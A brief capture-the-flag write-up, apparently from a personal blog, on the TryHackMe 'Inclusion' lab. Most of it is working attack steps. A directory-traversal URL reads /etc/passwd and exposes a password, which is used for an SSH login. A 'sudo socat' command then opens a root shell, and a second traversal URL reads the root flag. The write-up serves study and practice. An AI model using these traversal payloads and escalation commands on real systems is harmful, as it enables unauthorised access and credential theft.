---
title: Inclusion
description: 'LFI to get SSH credentials and escalating to root with socat'
pubDate: 2021-06-26
category: 'tryhackme'
tags: []
image: 'https://tryhackme-images.s3.amazonaws.com/room-icons/5e2656cb5a909ddf63395dd7e7a377ad.png'
---

## LFI
view-source:http://10.10.202.16/article?name=../../../../../../../etc/passwd

```
...[snip]...
#falconfeast:rootpassword
...[snip]...

## USER
```bash
ssh falconfeast@10.10.202.16 <- rootpassword
```


## ROOT
```bash
sudo -l
```

Shows socat can be execute as root

```bash
sudo socat stdin exec:/bin/sh
```

## NOTES
The web app is running as root.

So to get the root flag:
`http://10.10.202.16/article?name=../../../../../../../root/root.txt`
